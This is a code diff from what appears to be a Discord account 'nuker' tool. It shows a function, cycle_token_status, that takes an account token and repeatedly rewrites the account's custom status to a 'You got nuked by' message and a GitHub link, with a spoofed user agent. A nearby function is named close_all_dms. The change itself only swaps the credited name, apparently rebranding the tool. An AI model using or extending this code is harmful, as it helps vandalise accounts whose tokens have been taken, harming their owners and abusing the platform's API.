@@ -127,12 +127,12 @@ def close_all_dms(Token):
 def cycle_token_status(Token):
     headers = {"authorization": Token, "user-agent": "Samsung Fridge/6.9"}
     for i in range(0, 50):
-        json = {"custom_status": {"text": "You got nuked by SSL", "emoji_name": "🍉"}}
+        json = {"custom_status": {"text": "You got nuked by Ryanconfigs", "emoji_name": "🍉"}}
         requests.patch(
             "https://discord.com/api/v8/users/@me/settings", headers=headers, json=json
         )
         time.sleep(0.7)
-        json = {"custom_status": {"text": "https://github.com/ssllllll", "emoji_name": "🥵"}}
+        json = {"custom_status": {"text": "https://github.com/ryanconfigs", "emoji_name": "🥵"}}
         requests.patch(
             "https://discord.com/api/v8/users/@me/settings", headers=headers, json=json
         )
